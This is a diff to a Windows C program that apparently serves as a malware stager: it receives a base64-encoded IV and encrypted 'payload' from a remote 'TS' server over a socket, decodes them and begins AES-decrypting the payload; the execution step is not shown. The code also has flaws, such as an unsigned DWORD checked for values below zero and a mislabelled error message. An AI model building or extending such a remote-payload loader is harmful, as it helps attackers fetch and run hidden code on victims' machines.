@@ -14,6 +14,7 @@
 #include <stdlib.h>
 
 #include "aes.h"
+#include "base64.h"
 
 #define CBC 1
 #define MAX 4096
@@ -615,21 +616,48 @@ int main(int argc, char* argv[])
 		free(payload);
 		return 0;
 	}
-
-	DWORD iv_size = recvData(sockfd, iv, IV_MAX_SIZE, RETRIES);
-	DWORD ct_size = recvData(sockfd, ct, PAYLOAD_MAX_SIZE, RETRIES);
-	if (ct_size < 0 || iv_size < 0)
+	char * b64iv = (char *)malloc(IV_MAX_SIZE*2);
+	if (b64iv == NULL)
 	{
-		debug_print("%s", "recvData error, exiting\n");
+		debug_print("%s", "b64ct malloc failed!\n");
 		closesocket(sockfd);
 		free(iv);
 		free(ct);
 		free(payload);
 		return 0;
 	}
-	debug_print("Recv %d byte payload from TS\n", ct_size);
-	debug_print("IV: %s\n", iv);
-	debug_print("Start of ct: %.10s\n", ct);
+	char * b64ct = (char *)malloc(BUFFER_MAX_SIZE);
+	if (b64ct == NULL)
+	{
+		debug_print("%s", "b64ct malloc failed!\n");
+		closesocket(sockfd);
+		free(iv);
+		free(ct);
+		free(b64iv);
+		free(payload);
+		return 0;
+	}
+
+	DWORD iv_size = recvData(sockfd, b64iv, IV_MAX_SIZE, RETRIES);
+	DWORD ct_size = recvData(sockfd, b64ct, PAYLOAD_MAX_SIZE, RETRIES);
+	if (ct_size < 0 || iv_size < 0)
+	{
+		debug_print("%s", "recvData error, exiting\n");
+		closesocket(sockfd);
+		free(iv);
+		free(ct);
+		free(b64iv);
+		free(b64ct);
+		free(payload);
+		return 0;
+	}
+	debug_print("Recv %d byte b64ct from TS\n", ct_size);
+	debug_print("b64IV: %s\n", b64iv);
+	debug_print("Start of b64ct: %.10s\n", b64ct);
+	iv_size = Base64decode(iv, b64iv);
+	ct_size = Base64decode(ct, b64ct);
+	debug_print("Recv %d byte ct from TS\n", ct_size);
+	
 	// Decrypt payload
 	struct AES_ctx ctx;
 	//AES_init_ctx(&ctx, key);
